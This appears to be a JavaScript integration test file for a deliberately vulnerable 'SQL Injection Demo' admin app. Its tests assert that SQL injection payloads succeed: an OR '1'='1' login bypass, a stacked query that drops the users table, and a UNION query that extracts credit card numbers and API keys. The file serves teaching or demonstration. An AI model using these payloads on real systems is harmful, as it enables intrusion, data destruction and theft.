const request = require("supertest");
const app = require("../../src/app");
const adminModel = require("../../src/models/adminModel");

describe("Admin Route Integration & Attack Tests", () => {
    beforeEach(() => {
        adminModel.initDb();
    });

    describe("POST /api/v1/admin/login", () => {
        it("should return 200 with user on valid credentials", async () => {
            const res = await request(app)
                .post("/api/v1/admin/login")
                .send({ username: "admin", password: "admin123" })
                .expect(200);

            expect(res.body[0].username).toBe("admin");
        });

        it("should return 401 on invalid credentials without injection", async () => {
            const res = await request(app)
                .post("/api/v1/admin/login")
                .send({ username: "admin", password: "wrongpassword" })
                .expect(401);

            expect(res.body.error).toBe("Invalid credentials");
        });

        it("should bypass login with 'admin\\' OR \\'1\\'=\\'1' attack", async () => {
            const res = await request(app)
                .post("/api/v1/admin/login")
                .send({ username: "admin' OR '1'='1", password: "arbitrary_wrong_password" })
                .expect(200);

            expect(res.body[0].username).toBe("admin");
        });
    });

    describe("POST /api/v1/admin/posts", () => {
        it("should add a post and return the latest post", async () => {
            const res = await request(app)
                .post("/api/v1/admin/posts")
                .send({ title: "New Blog Post", content: "Post content" })
                .expect(200);

            expect(res.body.title).toBe("New Blog Post");
        });

        it("should execute stacked query and drop users table", async () => {
            await request(app)
                .post("/api/v1/admin/posts")
                .send({ title: "New Blog Post", content: "test'); DROP TABLE users; --" })
                .expect(200);

            // Attempting to query users will fail with 500 because table was dropped
            const loginRes = await request(app)
                .post("/api/v1/admin/login")
                .send({ username: "admin", password: "admin123" })
                .expect(500);

            expect(loginRes.body.error).toContain("no such table: users");
        });
    });

    describe("GET /api/v1/admin/users/profile", () => {
        it("should return profile for valid user", async () => {
            const res = await request(app)
                .get("/api/v1/admin/users/profile?username=admin")
                .expect(200);

            expect(res.body[0].username).toBe("admin");
            expect(res.body[0].email).toBe("admin@blog.com");
        });

        it("should return 404 for non-existent user", async () => {
            const res = await request(app)
                .get("/api/v1/admin/users/profile?username=nonexistent")
                .expect(404);

            expect(res.body.error).toBe("User not found");
        });

        it("should exfiltrate sensitive data via UNION attack", async () => {
            const attackQuery = "admin' UNION SELECT credit_card, api_key FROM users WHERE '1'='1";
            const res = await request(app)
                .get(`/api/v1/admin/users/profile?username=${encodeURIComponent(attackQuery)}`)
                .expect(200);

            expect(res.body.length).toBeGreaterThan(1);
            const sensitiveEntry = res.body.find(u => u.username && u.username.includes("4532-xxxx-xxxx"));
            expect(sensitiveEntry).toBeDefined();
            expect(sensitiveEntry.email).toContain("sk_live_");
        });
    });

    describe("GET /admin and GET /", () => {
        it("should serve the HTML UI exclusively on /admin", async () => {
            const res = await request(app)
                .get("/admin")
                .expect(200);

            expect(res.text).toContain("Admin Portal - SQL Injection Demo");
        });

        it("should return simple course rating service message on root /", async () => {
            const res = await request(app)
                .get("/")
                .expect(200);

            expect(res.text).toBe("Simple course rating service");
        });
    });
});
